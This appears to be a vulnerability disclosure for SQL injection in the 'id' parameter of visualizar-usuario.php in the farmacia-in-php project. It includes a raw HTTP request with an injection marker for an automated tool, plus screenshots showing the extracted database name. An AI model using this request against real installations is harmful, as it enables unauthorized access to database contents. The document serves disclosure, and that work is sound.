# farmacia-in-php has sql injection in visualizar-usuario.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
/visualizar-usuario.php?id=1

## describe

The visualizar-usuario.php file of the farmacia-in-php system has an SQL injection vulnerability, and the parameter parameter :id can be controlled.  This vulnerability allows a malicious attacker to obtain sensitive database information

**Code analysis**    

The id parameter is obtained and passed to the SQL statement for execution without filtering

![image-20241127114056890](https://github.com/user-attachments/assets/25785838-8615-45dc-b5e9-a040bdc7b32f)



## POC

```
GET /visualizar-usuario.php?id=1* HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ecmd5kmr6te8fpgjnri7c4up85
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

save as  1.txt

**Result**

![image-20241127114130182](https://github.com/user-attachments/assets/7b93aa0e-1a79-4ca2-b4a2-4c4e24532a88)

Get databases: farmacia

![image-20241127110033174](https://github.com/user-attachments/assets/5afaaaef-0913-4bb8-ba01-d78d7678b755)